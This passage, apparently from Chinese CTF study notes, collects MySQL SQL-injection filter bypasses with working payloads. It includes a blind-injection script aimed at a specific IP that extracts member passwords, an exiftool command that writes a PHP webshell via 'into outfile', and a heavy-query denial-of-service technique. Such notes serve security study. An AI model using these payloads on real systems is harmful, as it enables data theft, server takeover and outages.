len个字符。rpad(str,len,padstr)用字符串 padstr对 str进行右边填补直至它的长度达到 len个字符长度，然后返回 str。如果 str的长度长于 len&#39;，那么它将被截除到 len个字符。</code></pre><p><strong>返回对应的ascii码的函数</strong></p><pre><code>ascii(单个字符)ord(单个字符)</code></pre><p><strong>char函数绕过一些关键字过滤</strong></p><pre><code>char(num)</code></pre><h3 id="2-1-2-绕过逗号"><a href="#2-1-2-绕过逗号" class="headerlink" title="2.1.2  绕过逗号"></a>2.1.2  绕过逗号</h3><p><strong>使用join绕过</strong></p><pre><code>union select 1,2   #等价于 union select * from (select 1)a join (select 2)bselect * from name union select * from  (select 1)a join (select 2)b join (select 3)c join (select 4)d;</code></pre><p><strong>使用from或者offset绕过</strong></p><pre><code>select substr(database(),1,1);select substr(database() from 1 for 1);select mid(database() from 1 for 1);</code></pre><p><strong>使用like</strong></p><pre><code>select ascii(mid(user(),1,1))=80;  #等价于select user() like &#39;r%&#39;;&#39;r%&#39;代表以字符串r开头，匹配成功返回1，失败返回0</code></pre><p><strong>对于limit可以使用offset来绕过</strong></p><pre><code>select * from news limit 0,1等价于下面这条SQL语句  select * from news limit 1 offset 0</code></pre><h3 id="2-1-3-绕过空格"><a href="#2-1-3-绕过空格" class="headerlink" title="2.1.3  绕过空格"></a>2.1.3  绕过空格</h3><p><strong>一些字符替代</strong></p><pre><code>/**/%0a%0b%0c%0d其他思路:使用括号、反引号`等组合?id=-1%0aunion(select(100),(200),(300))%23</code></pre><p><strong>反引号` （格式输出表的控制符）</strong></p><p>反引号`：它是为了区分MYSQL的保留字与普通字符而引入的符号。<br>注意划<strong>重点</strong>：有MYSQL保留字作为字段的，必须加上反引号来区分！<br>所谓的保留字就是select database insert 这一类数据库的sql指令，当我们不得已要拿他们来做表名和字段名<br>的时候 我们必须要加反引号来避免编译器把这部分认为是保留字而产生错误。<br>务必要<strong>记住</strong>：保留字既不能作为表名，也不能作为字段名，如果非要这么操作，请记住要增加反引号。<br>反引号`使用的地方:反引号可以用在字段名、表名、某些内置变量的两边，用来代替空格来连接sql语句。<br>可以使用反引号连接的内置变量：version()<br>不可以使用反引号连接的内置变量:database()、@@datadir、@@basedir</p><pre><code>举例1：mysql&gt; select`version`();+-------------------------+| `version`()             |+-------------------------+| 5.7.29-0ubuntu0.16.04.1 |+-------------------------+举例2：mysql&gt; select`xm`from`name`where`id`=1;+------+| xm   |+------+| nick |+------+</code></pre><p><strong>巧用加减点符号绕过空格</strong></p><pre><code>点.的作用:数值和sql指令(union、from等)可以使用点来拼接。字符串不行mysql&gt; select * from user where id=-1.union select 100,200,300;  成功mysql&gt; select * from user where id=&#39;-1&#39;.union select 100,200,300;  失败select+id-1+1.from user;&quot;+id&quot;中的+代表正数的意思(也可以换成&quot;-id&quot;，代表负数)，可用于绕过空格来连接select和字段名。&quot;+id-1+1&quot;表示运算，将id的值减一再加一。&quot;+id-1+1.from&quot;中间的点可以将数值和sql指令(from)进行拼接。(后面的加减表示运算符减1和加1，目的是为了可以用点和from进行拼接)实际上是让字段的值进行了运算，但是这样会把字符串强制转换成数值。(导致字符串内容&quot;丢失&quot;)</code></pre><p><strong>MySQL条件注释绕过正则关键字过滤 /*!50000SELECT*/</strong></p><pre><code>例：/*!50000SELECT*/在MySQL5.0及以上版本中等价于SELECT成功的payloadselect * from user where id=-1/*!50000union*//*!50000select*/100,200,300;select * from user where id=-1/*!00000union*//*!50000select*/100,200,300;select * from user where id=-1/*!10000union*//*!50000select*/100,200,300;select * from user where id=-1/*!40000union*//*!50000select*/100,200,300select * from user where id=-1/*!40000union*//*!40000select*/100,200,300;/*!50000SELECT*/username from user where id=1;还可以达到绕过一些空格过滤的效果下面几个是失败的payloadselect * from user where id=-1/*!0000union*//*!50000select*/100,200,300select * from user where id=-1/*!310000union*//*!50000select*/100,200,300;select * from user where id=-1/*!31230000union*//*!50000select*/100,200,300;</code></pre><p><strong>HPF (HTTP参数分割)</strong></p><pre><code>举例如下：mysql&gt; select * from name where id=1 union/*&amp;b=*/select+1,2,3,4/*&amp;c=*/from/**/name;+----+------+------+------------+| id | xm   | xb   | csny       |+----+------+------+------------+|  1 | nick | bo   | 1971-10-01 ||  1 | 2    | 3    | 4          |+----+------+------+------------+</code></pre><p><strong>mysql查询的时候将会忽略字符串尾部的空格</strong></p><h3 id="2-1-4-绕过if过滤"><a href="#2-1-4-绕过if过滤" class="headerlink" title="2.1.4  绕过if过滤"></a>2.1.4  绕过if过滤</h3><p><strong>方式一：使用case-when来代替if</strong></p><pre><code>select case when (substring((select user()) from 1 for 1)=&#39;r&#39;) then sleep(1) elsesleep(0) end;-----------------------------------------------------------------------------------------用到bool盲注的时候记得要加ascii        # payload = &#39;(select case when (ascii(substring((select database()) from {} for 1))&gt;{}) then 1 else 2 end)&#39;        # payload = &#39;(select case when (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema = database()),{},1))&gt;{}) then 1 else 2 end)&#39;        # payload = &#39;(select case when (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = 0x7573657273),{},1))&gt;{}) then 1 else 2 end)&#39;        # payload = &#39;(select case when (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = 0x6d656d626572),{},1))&gt;{}) then 1 else 2 end)&#39;</code></pre><p><strong>方式二：</strong></p><pre><code>elt(1+布尔表达式,1,sleep(1));select * from user where id = 1 and elt(1+布尔表达式,1,sleep(1));ELT(N ,str1 ,str2 ,str3 ,…)函数使用说明：若 N = 1 ，则返回值为str1 ，若 N = 2 ，则返回值为str2，以此类推。若 N小于1或大于参数的数目，则返回值为NULL 。</code></pre><p><strong>构造举例：</strong></p><pre><code>mysql&gt; select * from name where id=1 or elt( 1+ (ord(substr(user(),1,1))=114),111,sleep(0.1));+----+------+------+------------+| id | xm   | xb   | csny       |+----+------+------+------------+|  1 | nick | bo   | 1971-10-01 |+----+------+------+------------+1 row in set (0.30 sec)mysql&gt; select * from name where id=1^elt( 1+ (ord(substr(user(),1,1))=114),111,sleep(0.1));+----+------+------+------------+| id | xm   | xb   | csny       |+----+------+------+------------+|  1 | nick | bo   | 1971-10-01 |+----+------+------+------------+1 row in set (0.40 sec)-----------------------------------------------------------------------------------------mysql&gt; select * from name where id=1 or elt(1+(ord(substr(user(),1,1))=0),111,sleep(0.1));+----+------+------+------------+| id | xm   | xb   | csny       |+----+------+------+------------+|  1 | nick | bo   | 1971-10-01 ||  2 | cc   | fo   | 1972-02-02 ||  3 | 2    | 3    | 1971-04-01 ||  4 | 2    | 3    | 1971-04-01 |+----+------+------+------------+4 rows in set (0.00 sec)</code></pre><p><strong>发现的另外的一个点：</strong></p><pre><code>mysql&gt; select * from name where id=1 or 1;+----+------+------+------------+| id | xm   | xb   | csny       |+----+------+------+------------+|  1 | nick | bo   | 1971-10-01 ||  2 | cc   | fo   | 1972-02-02 ||  3 | 2    | 3    | 1971-04-01 ||  4 | 2    | 3    | 1971-04-01 |+----+------+------+------------+4 rows in set (0.00 sec)mysql&gt; select * from name where id=1 or 0;+----+------+------+------------+| id | xm   | xb   | csny       |+----+------+------+------------+|  1 | nick | bo   | 1971-10-01 |+----+------+------+------------+1 row in set (0.00 sec)</code></pre><p><strong>方式三：</strong></p><p>select * from user where id = 1 and field（1,sleep（1））;</p><p> FIELD（str,str1,str2,str3,…） </p><p>返回str在str1, str2, str3,… 列表中的索引（位置从1开始）。如果str没有找到，返回值为0。根据索引的值执行时间有区别，由此可以判断字符。 </p><pre><code>配合延时注入应用实例：import requestsimport time as tfrom urllib.parse import quoteurl = &#39;http://134.175.185.244/member.php?orderby=&#39;alphabet = [&#39;,&#39;,&#39;a&#39;,&#39;T&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;j&#39;,&#39;h&#39;,&#39;i&#39;,&#39;g&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;,&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,&#39;A&#39;,&#39;B&#39;,&#39;C&#39;,&#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;I&#39;,&#39;G&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;,&#39;O&#39;,&#39;P&#39;,&#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,&#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W&#39;,&#39;X&#39;,&#39;Y&#39;,&#39;Z&#39;,&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;]sql = &#39;select database()&#39;sql = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;sql = &#39;select group_concat(column_name) from information_schema.columns where table_schema=database()&#39;sql = &#39;select password from member&#39;result = &#39;&#39;for i in range(1,30):    for char in alphabet:        payload = &quot;and case when (FIELD(substr(({}),{},1),&#39;{}&#39;)=1) then (benchmark(10000000,sha1(sha(sha(1)))))end;&quot;.format(sql, i, char)        start = int(t.time())        r = requests.get(url+payload)        end = int(t.time()) - start        if end &gt;= 3:            result += char            print(result)            break</code></pre><pre><code>mysql&gt; select(field(0,sleep(1)));+---------------------+| (field(0,sleep(1))) |+---------------------+|                   1 |+---------------------+1 row in set (1.00 sec)mysql&gt; select * from name where id = 1 and (field(0,sleep(1)));+----+------+------+------------+| id | xm   | xb   | csny       |+----+------+------+------------+|  1 | nick | bo   | 1971-10-01 |+----+------+------+------------+1 row in set (2.01 sec)---------------------------------------特性举例--------------------------------------------mysql&gt; select(field(1,sleep(1)));+---------------------+| (field(1,sleep(1))) |+---------------------+|                   0 |+---------------------+1 row in set (1.00 sec)mysql&gt; select * from name where id = 1 and (field(1,sleep(1)));Empty set (1.00 sec)</code></pre><h3 id="2-1-5-绕过sleep过滤"><a href="#2-1-5-绕过sleep过滤" class="headerlink" title="2.1.5  绕过sleep过滤"></a>2.1.5  绕过sleep过滤</h3><p><strong>方式一：</strong>benchmark（10000,md5（1））;</p><pre><code>mysql&gt; select(benchmark(10000000,sha(1)));+------------------------------+| (benchmark(10000000,sha(1))) |+------------------------------+|                            0 |+------------------------------+1 row in set (1.42 sec)mysql&gt; select(benchmark(100000000,sha(1)));+-------------------------------+| (benchmark(100000000,sha(1))) |+-------------------------------+|                             0 |+-------------------------------+1 row in set (13.82 sec)</code></pre><p><strong>方式二：</strong>Heavy Query</p><p>用到一些消耗资源的方式让数据库的查询时间尽量变长，<br>而消耗数据库资源的最有效的方式就是让两个大表做笛卡尔积，这样就可以让数据库的查询慢下来，<br>而最后找到系统表information_schema数据量比较大，可以满足要求，所以我们让他们做笛卡尔积。</p><pre><code>mysql&gt; select count(*) from information_schema.tables;+----------+| count(*) |+----------+|      281 |+----------+1 row in set (0.05 sec)-----------------------------------------------------------------------------------------mysql&gt; select count(*) from information_schema.columns;+----------+| count(*) |+----------+|     3081 |+----------+1 row in set (0.19 sec)</code></pre><p>共有281个tables，3081个columns，我们让3个3134做笛卡尔积运算，时间高达15分钟，足以进行Dos攻击。</p><pre><code>3列的运算select * from name where id = 1 and 1 and (SELECT count(*) FROMinformation_schema.columns A, information_schema.columns B, information_schema.columnsC);mysql&gt; select * from name where id = 1 and 1 and (SELECT count(*) FROM    -&gt; information_schema.columns A, information_schema.columns B, information_schema.columns    -&gt; C);+----+------+------+------------+| id | xm   | xb   | csny       |+----+------+------+------------+|  1 | nick | bo   | 1971-10-01 |+----+------+------+------------+1 row in set (15 min 40.81 sec)</code></pre><p>减少参与笛卡尔积的数量，可达到控制时间的目的</p><pre><code>2列1表的情况：mysql&gt; select * from name where id = 1 and 1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.Tables C);+----+------+------+------------+| id | xm   | xb   | csny       |+----+------+------+------------+|  1 | nick | bo   | 1971-10-01 |+----+------+------+------------+1 row in set (1 min 34.27 sec)-----------------------------------------------------------------------------------------2列1库的情况:mysql&gt; select * from name where id = 1 and 1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.SCHEMATA C);+----+------+------+------------+| id | xm   | xb   | csny       |+----+------+------+------------+|  1 | nick | bo   | 1971-10-01 |+----+------+------+------------+1 row in set (1.75 sec)-----------------------------------------------------------------------------------------</code></pre><p>故此，在无延时函数的情况下，可以使用<strong>heavy query</strong></p><pre><code>成功时：mysql&gt; select * from name where id = 1 and 1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.SCHEMATA C);+----+------+------+------------+| id | xm   | xb   | csny       |+----+------+------+------------+|  1 | nick | bo   | 1971-10-01 |+----+------+------+------------+1 row in set (1.76 sec)失败时：mysql&gt; select * from name where id = 1 and 0 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.SCHEMATA C);Empty set (0.00 sec)</code></pre><p><strong>方式三：</strong>get_lock()</p><p>get_lock(key, timeout)是Mysql的锁机制<br>(1)get_lock(key, timeout)会按照key来加锁，”别的客户端”再以同样的key加锁时就加不了了，处于等待状<br>态。<br>(2)当调用release_lock(key)来释放上面加的锁或客户端断线了，上面的锁才会释放，其它的客户端才能进来。<br>前提：长连接<br>mysql_connect() 脚本一结束，到服务器的连接就被关闭<br>mysql_pconnect() 打开一个到 MySQL 服务器的持久连接</p><p><img src="/2020/04/28/best-sql/2.png" alt="get_lock"></p><p>首先使用一个进程A连接mysql执行    mysql&gt; select get_lock(‘jaivy’,1);</p><p>再使用另一个进程B连接mysql并执行，mysql&gt; select get_lock(‘jaivy’,10);<br>这时候由于进程A已经锁定了key，所以这时候B将会等待超时timeout，本例的timeout为10s，从而达到了sleep的目的。</p><h3 id="2-1-6-其他绕过"><a href="#2-1-6-其他绕过" class="headerlink" title="2.1.6  其他绕过"></a>2.1.6  其他绕过</h3><h4 id="2-1-6-1-conv-10-10-36-代替字母"><a href="#2-1-6-1-conv-10-10-36-代替字母" class="headerlink" title="2.1.6.1  conv((10,10,36))代替字母"></a>2.1.6.1  <strong><code>conv((10,10,36))</code>代替字母</strong></h4><p><code>CONV(N,from_base,to_base)</code><br> N是要转换的数据，from_base是原进制，to_base是目标进制。 </p><pre><code>conv(10,10,36)是大写的Alower(conv(10,10,36))小写的alower(conv(10,10,16))小写的a</code></pre><h4 id="2-1-6-2-用-from-lt-空格-gt-代替-from"><a href="#2-1-6-2-用-from-lt-空格-gt-代替-from" class="headerlink" title="2.1.6.2  用 from.&lt;空格&gt;代替 from"></a>2.1.6.2  用 from.&lt;空格&gt;代替 from</h4><pre><code>用 from.&lt;空格&gt;代替 frommysql&gt; select * from. user;</code></pre><h4 id="2-1-6-3-注释符过滤替代"><a href="#2-1-6-3-注释符过滤替代" class="headerlink" title="2.1.6.3  注释符过滤替代"></a>2.1.6.3  注释符过滤替代</h4><pre><code>注释符:#、--+-、/**/</code></pre><h4 id="2-1-6-4-information-schema替代"><a href="#2-1-6-4-information-schema替代" class="headerlink" title="2.1.6.4  information_schema替代"></a>2.1.6.4  information_schema替代</h4><p>mysql &gt; 5.6 版本，利用sys库 </p><pre class="line-numbers language-mysql"><code class="language-mysql"># 爆表# schema_auto_increment_columnsselect group_concat(table_name)from sys.schema_auto_increment_columns where table_schema=database()--+# schema_table_statistics_with_bufferselect group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database()--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> mysql &gt; 5.5版本，利用<code>innodb_table_stats</code> </p><pre class="line-numbers language-mysql"><code class="language-mysql"># 爆表select group_concat(table_name) from mysql.innodb_table_stats<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="2-1-6-5-用greatest代替if判断"><a href="#2-1-6-5-用greatest代替if判断" class="headerlink" title="2.1.6.5  用greatest代替if判断"></a>2.1.6.5  用greatest代替if判断</h4><p><code>greatest(n1,n2,n3,...)</code>函数返回输入参数<code>(n1,n2,n3,...)</code>的最大值。 </p><h2 id="2-2-特殊绕过研究"><a href="#2-2-特殊绕过研究" class="headerlink" title="2.2 特殊绕过研究"></a>2.2 特殊绕过研究</h2><h3 id="2-2-1-特殊报错注入（绕过多关键字过滤）"><a href="#2-2-1-特殊报错注入（绕过多关键字过滤）" class="headerlink" title="2.2.1 特殊报错注入（绕过多关键字过滤）"></a>2.2.1 特殊报错注入（绕过多关键字过滤）</h3><p><strong>参考资料：</strong></p><p><strong>1、</strong>mysql注入可报错时爆表名、字段名、库名  <a href="http://www.wupco.cn/?p=4117" target="_blank" rel="noopener">http://www.wupco.cn/?p=4117</a></p><p><strong>2、</strong>mysql官方 <a href="https://dev.mysql.com/doc/refman/5.7/en/gis-mysql-specific-functions.html#function_polygon" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/5.7/en/gis-mysql-specific-functions.html#function_polygon</a></p><p>已知某个地方有注入，但waf拦截了information_schema、columns、tables、database、schema等关键字或函数，我们如何去获取当前表名，字段名和库名呢？ </p><p><strong>1、已知表名name，利用报错注入得到字段名。</strong></p><p>下例就把当前表name的第一个字段成功爆出来了。这个的原理就是在使用别名的时候，表中不能出现相同的字段名，于是我们就利用join把表扩充成两份，在最后别名c的时候查询到重复字段，就成功报错。</p><pre><code>mysql&gt; select * from (select * from name as a join name as b) as c;ERROR 1060 (42S21): Duplicate column name &#39;id&#39;</code></pre><p> <strong>同时，可以利用using依次爆其他字段</strong> </p><pre><code>mysql&gt; select * from (select * from name as a join name as b using(id)) as c;ERROR 1060 (42S21): Duplicate column name &#39;xm&#39;mysql&gt; select * from (select * from name as a join name as b using(xm)) as c;ERROR 1060 (42S21): Duplicate column name &#39;id&#39;mysql&gt; mysql&gt; select * from (select * from name as a join name as b using(id,xm)) as c;ERROR 1060 (42S21): Duplicate column name &#39;xb&#39;mysql&gt; select * from (select * from name as a join name as b using(id,xm,xb)) as c;ERROR 1060 (42S21): Duplicate column name &#39;csny&#39;mysql&gt; select * from (select * from name as a join name as b using(id,xm,xb,csny)) as c;+----+------+------+------------+| id | xm   | xb   | csny       |+----+------+------+------------+|  1 | nick | bo   | 1971-10-01 ||  2 | cc   | fo   | 1972-02-02 ||  3 | 2    | 3    | 1971-04-01 ||  4 | 2    | 3    | 1971-04-01 |+----+------+------+------------+4 rows in set (0.03 sec)</code></pre><p><strong>由于上例用到了using，下面附上using的用法：</strong></p><p>using等价于join操作中的on，例如a和b根据id字段关联，那么using(id)和on a.id=b.id等价；</p><pre><code>select a.name,b.age from test as a join test2 as b on a.id=b.id-------------------------------------两者等价----------------------------------------------select a.name,b.age from test as a join test2 as b using(id)</code></pre><p><strong>2、已知表名name，包含字段名id，利用报错注入得到库名。</strong></p><p><strong>方式一：</strong>大佬翻阅mysql的文档发现了一个非常好玩的函数</p><p><img src="/2020/04/28/best-sql/1.png" alt="Polygon">Polygon从多个<code>LineString</code>或<code>WKB LineString</code>参数构造一个值 。如果任何参数不表示<code>LinearRing</code>（也就是说，不是一个封闭和简单的<code>LineString</code>），返回值就是<code>NULL</code>。（好吧，这段话我也不懂！！！）</p><p>简单来说，就是如果传参不是linestring的话，就会爆错，而当如果我们已知表名，传入的又是存在的字段的话，就会<strong>爆出已知库、表、列</strong>。 </p><pre><code>mysql&gt; select * from name where id=1 and Polygon(id);ERROR 1367 (22007): Illegal non geometric &#39;`first`.`name`.`id`&#39; value found during parsing#multipolygon()、linestring()、multilinestring()函数这些函数也有相同的效果！！</code></pre><p><strong>方式二：</strong>exp(~(select id from(select database())a))</p><p>也是需要知道表名和字段名，通过报错得到数据库名。</p><pre><code>mysql&gt; select * from name where id=1 or exp(~(select id from(select database())a));ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(~((select `first`.`name`.`id` from (select database() AS `database()`) `a`)))&#39;</code></pre><p><strong>3、 限制payload长度</strong></p><p>上面的方法已经可以爆出库名了，但是如果我限制了payload的长度又如何呢？比如 四字节？ </p><pre><code>mysql&gt; select * from name where id = 1-a();ERROR 1305 (42000): FUNCTION first.a does not exist</code></pre><p>库名成功出来了，原理：一个库中存在不同的系统或自定义函数，如果函数不存在，他就会爆出这个库没有此函数。 </p><h3 id="2-2-2-无列名注入（绕过未知字段名）"><a href="#2-2-2-无列名注入（绕过未知字段名）" class="headerlink" title="2.2.2 无列名注入（绕过未知字段名）"></a>2.2.2 无列名注入（绕过未知字段名）</h3><p><strong>参考资料：</strong>  </p><p><strong>1、</strong><a href="http://www.poluoluo.com/server/201706/547394.html" target="_blank" rel="noopener">http://www.poluoluo.com/server/201706/547394.html</a></p><p><strong>2、</strong>聊一聊bypass information_schema  <a href="https://www.anquanke.com/post/id/193512#h2-5" target="_blank" rel="noopener">https://www.anquanke.com/post/id/193512#h2-5</a>                     </p><p>在无列名的情况下，用子查询可以很简单的将数据跑出来。<br>子查询是将一个查询语句嵌套在另一个查询语句中。在特定情况下，一个查询语句的条件需要另一个查询语句来获取，内层查询（inner query）语句的查询结果，可以为外层查询（outer query）语句提供查询条件。</p><p>union搭配别名子查询，在不知道字段的时候进行注入。 </p><p><strong>方式一：</strong></p><pre><code>mysql&gt; select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d;+---+---+---+---+| 1 | 2 | 3 | 4 |+---+---+---+---+| 1 | 2 | 3 | 4 |+---+---+---+---+1 row in set (0.00 sec)mysql&gt; select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d union select * from name;+---+------+------+------------+| 1 | 2    | 3    | 4          |+---+------+------+------------+| 1 | 2    | 3    | 4          || 1 | nick | bo   | 1971-10-01 || 2 | cc   | fo   | 1972-02-02 || 3 | 2    | 3    | 1971-04-01 || 4 | 2    | 3    | 1971-04-01 |+---+------+------+------------+5 rows in set (0.03 sec)mysql&gt; select e.4 from (select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d union select * from name)e;+------------+| 4          |+------------+| 4          || 1971-10-01 || 1972-02-02 || 1971-04-01 || 1971-04-01 |+------------+5 rows in set (0.03 sec)mysql&gt; select e.4 from (select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d union select * from name)e limit 1 offset 3;#(select 1)a,(select 2)b,(select 3)c,(select 4) 这一部分要有逗号，数字不能重复，因为select e.4这里的4就对应着这一部分的4，也就是第四列。+------------+| 4          |+------------+| 1971-04-01 |+------------+1 row in set (0.00 sec)mysql&gt; select * from name where id=1 union select (select e.4 from (select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d    -&gt; union select * from name)e limit 1 offset 3)f,(select 1)g,(select 1)h,(select 1)i;+------------+------+------+------------+| id         | xm   | xb   | csny       |+------------+------+------+------------+| 1          | nick | bo   | 1971-10-01 || 1971-04-01 | 1    | 1    | 1          |+------------+------+------+------------+2 rows in set (0.03 sec)</code></pre><p><strong>方式二：</strong></p><pre><code>mysql&gt; select `2` from (select 1,2,3,4 union select * from name)a;+------+| 2    |+------+| 2    || nick || cc   || 2    || 2    || 2    |+------+</code></pre><p><strong>方式三：</strong></p><p>单字段：</p><pre><code>mysql&gt; select((select 0x6669)&lt;(select database()));+---------------------------------------+| ((select 0x6669)&lt;(select database())) |+---------------------------------------+|                                     1 |+---------------------------------------+mysql&gt; select((select 0x667a)&lt;(select database()));+---------------------------------------+| ((select 0x667a)&lt;(select database())) |+---------------------------------------+|                                     0 |+---------------------------------------+</code></pre><p>多字段：需要第一个字段相等，然后才会去比较下一个字段，所以该方法是具有局限性的，一般只能比较最多两个字段的。</p><pre><code>(select 1,0x{hex})&lt;(select * from {table_name})mysql&gt; select((select 1,2)&lt;(select 0,3));+-----------------------------+| ((select 1,2)&lt;(select 0,3)) |+-----------------------------+|                           0 |+-----------------------------+1 row in set (0.00 sec)mysql&gt; select((select 1,2)&lt;(select 1,1));+-----------------------------+| ((select 1,2)&lt;(select 1,1)) |+-----------------------------+|                           0 |+-----------------------------+1 row in set (0.00 sec)mysql&gt; select((select 1,2)&lt;(select 1,3));+-----------------------------+| ((select 1,2)&lt;(select 1,3)) |+-----------------------------+|                           1 |+-----------------------------+1 row in set (0.00 sec)</code></pre><h2 id="2-3-特殊注入研究"><a href="#2-3-特殊注入研究" class="headerlink" title="2.3  特殊注入研究"></a>2.3  特殊注入研究</h2><h3 id="2-3-1-双竖线拼接"><a href="#2-3-1-双竖线拼接" class="headerlink" title="2.3.1  双竖线拼接"></a>2.3.1  双竖线拼接</h3><p>参考资料：</p><p><strong>1、</strong>[SUCTF 2019]EasySQL    <a href="https://www.cnblogs.com/chrysanthemum/p/11729891.html" target="_blank" rel="noopener">https://www.cnblogs.com/chrysanthemum/p/11729891.html</a></p><p><strong>后台sql语句：</strong></p><p><code>$sql = &quot;select&quot;.$_POST[&#39;query&#39;].&quot;||flag from Flag&quot;;</code></p><p><strong>方法1、</strong>set sql_mode=pipes_as_concat;    将管道符作为连接符</p><pre><code>mysql&gt; select 1;set sql_mode=pipes_as_concat;select 1||xm from name;+---+| 1 |+---+| 1 |+---+1 row in set (0.00 sec)Query OK, 0 rows affected (0.00 sec)+-------+| 1||xm |+-------+| 1nick || 1cc   || 12    || 12    |+-------+4 rows in set (0.00 sec)</code></pre><p><strong>方法2、</strong>*,1拼接管道符实现查询所有。</p><p>如果省略,1       就会报错。</p><p>如果省略*，    只会出现1</p><pre><code>mysql&gt; select *,1||xm from name;+----+------+------+------------+-------+| id | xm   | xb   | csny       | 1||xm |+----+------+------+------------+-------+|  1 | nick | bo   | 1971-10-01 | 1nick ||  2 | cc   | fo   | 1972-02-02 | 1cc   ||  3 | 2    | 3    | 1971-04-01 | 12    ||  4 | 2    | 3    | 1971-04-01 | 12    |+----+------+------+------------+-------+4 rows in set (0.00 sec)-----------------------------------------------------------------------------------------mysql&gt; select *||xm from name;ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;||xm from name&#39; at line 1-----------------------------------------------------------------------------------------mysql&gt; select 1||xm from name;+-------+| 1||xm |+-------+|     1 ||     1 ||     1 ||     1 |+-------+4 rows in set (0.00 sec)mysql&gt; select 1|xm from name;#相当于做了一个或运算+------+| 1|xm |+------+|    1 ||    1 ||    3 ||    3 |+------+4 rows in set, 2 warnings (0.00 sec)mysql&gt; select * from name;+----+------+------+------------+| id | xm   | xb   | csny       |+----+------+------+------------+|  1 | nick | bo   | 1971-10-01 ||  2 | cc   | fo   | 1972-02-02 ||  3 | 2    | 3    | 1971-04-01 ||  4 | 2    | 3    | 1971-04-01 |+----+------+------+------------+4 rows in set (0.00 sec)</code></pre><h3 id="2-3-2-文件注入"><a href="#2-3-2-文件注入" class="headerlink" title="2.3.2  文件注入"></a>2.3.2  文件注入</h3><p><strong>参考资料</strong></p><p><strong>1、</strong>【XCTF】upload writeup    <a href="https://blog.csdn.net/qq_42939527/article/details/102062412" target="_blank" rel="noopener">https://blog.csdn.net/qq_42939527/article/details/102062412</a></p><p><strong>2、</strong>你没见过的注入    <a href="https://www.gem-love.com/ctf/2283.html#%E4%BD%A0%E6%B2%A1%E8%A7%81%E8%BF%87%E7%9A%84%E6%B3%A8%E5%85%A5" target="_blank" rel="noopener">https://www.gem-love.com/ctf/2283.html#%E4%BD%A0%E6%B2%A1%E8%A7%81%E8%BF%87%E7%9A%84%E6%B3%A8%E5%85%A5</a></p><p><strong>文件名注入（XCTF–upload）</strong></p><p>文件名注入的题往往表面上是文件上传，实则后台会将上传文件的文件名插入到数据库，并有回显，我们在文件名处构造sql语句，从回显处得到我们想要的结果。</p><pre><code>猜测后台insert [表] values (&#39;文件名&#39;)测试语句1&#39; or updatexml() or &#39;1-----------------------------------------------------------------------------------------考虑到select滤过，用来双写绕过考虑到回显的16进制会被过滤字母，于是转为10进制绕过考虑到回显长度限制，所以用了substr进行截取&#39;+(selselectect conv(substr(hex(database()),1,12),16,10))+ &#39;.jpg&#39;+(selecselectt conv(substr(hex((selecselectt table_name frofromm information_schema.tables where table_schema=&#39;web_upload&#39; limit 1,1)),1,12),16,10))+&#39;.jpg&#39;+(selecselectt conv(substr(hex((selecselectt column_name frofromm information_schema.columns where table_name=&#39;hello_flag_is_here&#39; limit 0,1)),1,12),16,10))+&#39;.jpg&#39;+(selecselectt conv(substr(hex((selecselectt i_am_flag frofromm hello_flag_is_here limit 0,1)),1,12),16,10))+&#39;.jpg</code></pre><p><strong>文件内容注入（你没见过的注入）</strong></p><pre><code>&lt;?=`$_POST[0]`;用sql写一个一句话，但在我的mysql下会报错的，The MySQL server is running with the --secure-file-priv option so it cannot execute this statement-----------------------------------------------------------------------------------------exiftool -overwrite_original -comment=&quot;y1ng\&quot;&#39;);select 0x3C3F3D60245F504F53545B305D603B into outfile &#39;/var/www/html/1.php&#39;;--+&quot;</code></pre><h1 id="3-真题"><a href="#3-真题" class="headerlink" title="3. 真题"></a>3. 真题</h1><h2 id="3-1-bool盲注"><a href="#3-1-bool盲注" class="headerlink" title="3.1  bool盲注"></a>3.1  bool盲注</h2><h3 id="3-1-1-CISCN2019—Easyweb（buu）"><a href="#3-1-1-CISCN2019—Easyweb（buu）" class="headerlink" title="3.1.1  CISCN2019—Easyweb（buu）"></a>3.1.1  CISCN2019—Easyweb（buu）</h3><p><strong>类型：</strong>get型 + bool盲注 + 反引号逸出 + 